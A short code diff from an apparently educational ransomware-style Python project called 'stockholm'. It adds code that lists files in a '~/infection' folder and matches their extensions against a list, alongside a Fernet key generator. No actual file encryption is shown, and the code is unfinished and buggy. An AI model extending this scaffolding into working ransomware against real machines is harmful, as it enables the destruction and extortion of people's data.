@@ -17,8 +17,11 @@ def get_extentions(path_to_file: str) -> dict:
     d = {}
     with open(path_to_file) as f:
         for line in f:
-            d[line.rstrip()] = line.rstrip()
+            d[line.rstrip().split('.')[1]] = line.rstrip()
     return d
+
+def get_files(path_to_folder: str) -> list[str]:
+    return os.listdir(path_to_folder)
 
 def create_key() -> bytes:
         key = Fernet.generate_key()
@@ -52,7 +55,11 @@ def stockholm(key: bytes):
     extentions = get_extentions("extensions.txt")
     home = Path.home().as_posix()
     infection_dir = home + "/infection"
+    files = get_files(infection_dir)
     print(extentions)
+    print(files[0].split('.'))
+    if extentions[files[0].split('.')[1]]:
+        print("LOL")
     
 
 def main():
